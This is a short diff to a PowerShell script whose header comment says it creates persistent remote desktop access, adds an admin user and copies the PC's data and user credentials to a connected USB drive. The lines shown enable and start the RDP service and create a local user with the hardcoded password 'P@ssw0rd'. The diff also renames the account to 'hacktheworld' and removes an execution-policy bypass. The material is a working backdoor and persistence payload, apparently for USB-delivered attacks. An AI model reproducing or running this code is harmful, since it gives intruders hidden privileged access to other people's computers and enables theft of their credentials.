@@ -5,10 +5,9 @@
 # REM  create constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
 # mass storage device that is connected
 
-Set-ExecutionPolicy Bypass -Force
 Set-Service -Name TermService -StartupType Automatic
 Start-Service TermService
-$Username = "tamir5"
+$Username = "hacktheworld"
 $Password = "P@ssw0rd"
 $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
 New-LocalUser -Name $Username -Password $SecurePassword -Description "New User with Admin Rights"
